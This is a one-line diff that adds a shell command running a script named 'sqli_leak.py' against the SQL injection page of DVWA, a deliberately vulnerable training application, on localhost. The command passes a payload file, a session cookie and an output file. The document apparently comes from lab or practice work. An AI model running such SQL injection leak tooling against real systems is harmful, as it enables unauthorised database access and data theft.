@@ -1,0 +1,1 @@
+python3 sqli_leak.py "http://localhost/DVWA/vulnerabilities/sqli/?id=X&Submit=Submit#" "get" "where.txt" "PHPSESSID=t3u2vbapjdedt2t75e22n2vlhv;security=low" 4485 "sqli_leak_results_2.txt"
